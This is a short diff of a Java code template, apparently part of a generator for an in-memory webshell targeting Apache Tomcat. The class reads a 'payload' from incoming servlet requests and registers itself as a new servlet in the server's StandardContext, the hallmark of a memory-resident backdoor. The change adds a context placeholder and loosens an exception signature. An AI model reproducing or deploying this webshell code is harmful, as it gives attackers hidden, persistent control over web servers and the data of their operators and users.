@@ -8,6 +8,7 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
 {common}
 {decoder}
 {stub}
+{context}
     private void hook(Object servletRequest, Object servletResponse)
             throws Exception {{
         String payload = (String) invokeMethod(
@@ -27,8 +28,7 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
         return null;
     }}
 
-    private void addSevlet(Object proxyObject)
-            throws IllegalAccessException, InvocationTargetException {{
+    private void addSevlet(Object proxyObject) throws Exception {{
         Object context = getStandardContext();
         Object wrapper = invokeMethod(context, "createWrapper");
         String name = this.getClass().getName();
